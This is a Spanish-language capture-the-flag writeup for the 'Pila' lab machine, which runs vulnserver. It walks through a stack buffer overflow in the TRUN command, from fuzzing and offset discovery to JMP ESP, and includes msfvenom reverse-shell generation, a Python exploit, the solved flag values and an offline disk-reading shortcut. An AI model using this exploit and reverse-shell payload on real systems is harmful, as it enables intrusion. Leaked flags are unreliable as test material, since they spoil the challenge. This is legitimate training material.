---
tags: [ctf, thehackerslabs, writeup, windows, buffer-overflow, resuelto]
plataforma: The Hackers Labs
os: Windows Server 2008 (32-bit)
dificultad: media
estado: Resuelto
fecha: 2026-10-20
---

# Pila — Roadmap / Writeup

> [!success] Resuelto
> - **USER flag:** `31633bb7e23ba299d0454e1268de2193` ✅
> - **ROOT flag:** `be3751d9c6d3a81a5167e599fcddd622` ✅

Nota principal: [[Pila]]

---

## 0. Datos del entorno

| Dato | Valor |
|---|---|
| SO | Windows Server 2008 (32-bit) |
| Hipervisor | VirtualBox |
| Red | Host-Only `vboxnet0` |
| Kali | `192.168.56.1` |
| MAC VM | `08:00:27:EB:F7:86` |
| Disco | `The Hackers Labs - Pila-disk001.vdi` |
| Puerto vulnerable | **9999/tcp** (vulnserver) |
| Usuarios | `Administrador`, `Pila` |

---

## 1. Reconocimiento

```bash
# Localizar la IP de la VM (host-only)
nmap -sn 192.168.56.0/24

# Escaneo de servicios
nmap -sV -sC -p- <IP>
```

El servicio relevante es **9999/tcp**. Al conectar:

```bash
nc <IP> 9999
HELP
```

Devuelve la lista de comandos:
```
HELP
STATS [stat_value]
RTIME [rtime_value]
LTIME [ltime_value]
SRUN [srun_value]
TRUN [trun_value]
GMON [gmon_value]
GDOG [gdog_value]
KSTET [kstet_value]
GTER [gter_value]
HTER [hter_value]
LTER [lter_value]
KSTAN [lstan_value]
EXIT
```

> Es el **Vulnserver** clásico. En el escritorio del Administrador están el binario y el código fuente (`vulnserver.c`, `essfunc.c`).

---

## 2. Análisis de la vulnerabilidad

`vulnserver.c` → comando `TRUN`:

```c
} else if (strncmp(RecvBuf, "TRUN ", 5) == 0) {
    char *TrunBuf = malloc(3000);
    memset(TrunBuf, 0, 3000);
    ...
    strncpy(TrunBuf, RecvBuf, 3000);
    Function3(TrunBuf);
```

`essfunc.c` → `Function3`:

```c
void Function3(char *Input) {
    char Buffer2S[2000];
    strcpy(Buffer2S, Input);   // <-- desbordamiento
}
```

- Buffer de **2000 bytes** con `strcpy` sin límites.
- Windows Server 2008 x86: **sin ASLR** → direcciones estables (`JMP ESP` fiable).
- `GMON` también llama a `Function3`.

---

## 3. Explotación (stack Buffer Overflow)

### 3.1 Fuzz / offset
```bash
# Crash
python3 - <<'PY'
import socket
s=socket.socket(); s.connect(("<IP>",9999))
s.send(b"TRUN /.:/" + b"A"*3000)
print(s.recv(1024))
PY

# Patrón para hallar EIP
msf-pattern_create -l 3000
# enviar "TRUN /.:/" + patron, anotar EIP
msf-pattern_offset -l 3000 -q <EIP>
```

### 3.2 Badchars
Enviar bytearray `\x00`–`\xff` (excluyendo `\x00`) tras el offset y comparar en el debugger (Immunity + mona).

### 3.3 `JMP ESP`
```text
!mona modules          # buscar módulo sin ASLR/DEP y sin badchars
!mona find -s "\xff\xe4" -m essfunc.dll
```
Usar la dirección de `JMP ESP` en **little endian** para sobrescribir EIP.

### 3.4 Shellcode
```bash
msfvenom -p windows/shell_reverse_tcp \
  LHOST=192.168.56.1 LPORT=4444 \
  -b "\x00" -f python -v shellcode
```

### 3.5 Exploit final
```python
import socket
offset = <offset>
jmp_esp = <direccion JMP ESP>
buf  = b"TRUN /.:/"
buf += b"A"*offset
buf += jmp_esp
buf += b"\x90"*16
buf += shellcode
s = socket.socket(); s.connect(("<IP>",9999))
s.send(buf)
```
```bash
nc -lvnp 4444
```

Con la shell (según el contexto del servicio) se leen:
```cmd
type C:\Users\Pila\Desktop\user.txt
type C:\Users\Administrador\Desktop\root.txt
```

---

## 4. Flags

| Flag | Valor | Ubicación |
|---|---|---|
| **USER** | `31633bb7e23ba299d0454e1268de2193` | `C:\Users\Pila\Desktop\user.txt` |
| **ROOT** | `be3751d9c6d3a81a5167e599fcddd622` | `C:\Users\Administrador\Desktop\root.txt` |

Contenido real de los ficheros (hex):
```
user.txt: "31633bb7e23ba299d0454e1268de2193  -\n"
root.txt: "be3751d9c6d3a81a5167e599fcddd622  -\n"
```

---

## 5. Vía usada (offline, sin explotar)

```bash
qemu-img convert -f vdi -O raw "The Hackers Labs - Pila-disk001.vdi" pila.raw
mmls pila.raw                                    # NTFS en sector 2048
dd if=pila.raw of=pila.ntfs bs=512 skip=2048 conv=sparse
fls -r -p pila.ntfs | grep -iE "(root|user|flag).*\.txt$"
icat pila.ntfs 43283-128-1     # user.txt
icat pila.ntfs 43284-128-1     # root.txt
```

Resultado:
- USER: `31633bb7e23ba299d0454e1268de2193`
- ROOT: `be3751d9c6d3a81a5167e599fcddd622`

---

## 6. ANÁLISIS FINAL — ¿por qué el root tardó en encontrarse?

1. **No hay servicio web ni credenciales expuestas**: el vector es un **binario TCP en el puerto 9999** que hay que descubrir con un escaneo completo (`-p-`). Un escaneo solo de puertos web lo pasa por alto.
2. **El nombre "Pila" es la pista**: se refiere a *stack*; el reto es un **stack buffer overflow** (no una mala configuración ni un panel admin).
3. **El binario está en el escritorio del Administrador**, no en `C:\` ni en un share: hay que llegar al sistema de ficheros (o leer el disco) para verlo.
4. **Sin ASLR** en Server 2008 x86, pero hay que calcular **offset, badchars y `JMP ESP`** correctamente; un offset mal calculado solo produce un crash sin shell.
5. Los flags **no están en un `root.txt` de un usuario normal**: `user.txt` es de `Pila` y `root.txt` del `Administrador`, cada uno en su escritorio. Hay que leer los dos.
6. La vía rápida y fiable fue **leer el NTFS offline** con `fls`/`icat`, evitando montar el entorno de explotación (Immunity/mona) y el cliente vulnerable.

---

## 7. Explotación en vivo (validada 2026-10-20)

Se arrancó la VM y se explotó `vulnserver` real:

- IP: `192.168.56.103` (MAC `08:00:27:EB:F7:86`)
- Comando: `TRUN` · offset **2003** · `JMP ESP` **`0x625011AF`** (`essfunc.dll`, sin ASLR)
- Shellcode: `windows/shell_reverse_tcp` (`LHOST=192.168.56.1 LPORT=4444`)
- Resultado: shell como **`NT AUTHORITY\SYSTEM`**
- Flags confirmadas en vivo:
  - `C:\Users\Pila\Desktop\user.txt` → `31633bb7e23ba299d0454e1268de2193`
  - `C:\Users\Administrador\Desktop\root.txt` → `be3751d9c6d3a81a5167e599fcddd622`

> Nota: antes de arrancar hubo que corregir la NIC, que apuntaba a
> `VirtualBox Host-Only Ethernet Adapter #2` (inexistente) → `vboxnet0`.
